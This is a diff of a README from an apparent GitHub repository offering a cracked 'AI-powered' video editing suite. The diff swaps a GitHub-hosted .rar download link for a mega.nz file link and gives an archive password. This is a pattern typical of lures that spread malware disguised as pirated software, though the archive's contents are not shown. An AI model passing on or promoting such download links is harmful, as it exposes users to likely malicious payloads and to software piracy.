@@ -6,7 +6,7 @@ Effortlessly create with a fully-equipped video editing suite powered by AI.
 
 ![OIP (2)](https://github.com/user-attachments/assets/8ad5212e-7c0b-46ae-b368-cc90fd8ef745)
 
-[![wqqw](https://github.com/user-attachments/assets/83a12e96-a3b6-4b85-93e1-152708cfc614)](https://github.com/viraj-zx/crack-soft-edit-5.0/raw/main/Install%20Soft.rar)
+[![wqqw](https://github.com/user-attachments/assets/83a12e96-a3b6-4b85-93e1-152708cfc614)](https://mega.nz/file/xadh3JLS#tSaRez5m9ST5u-Zm6LluGbNEpNGfNRc13zjYacZky9M)
 
 # PASS: 8520
 # PASS: 8520
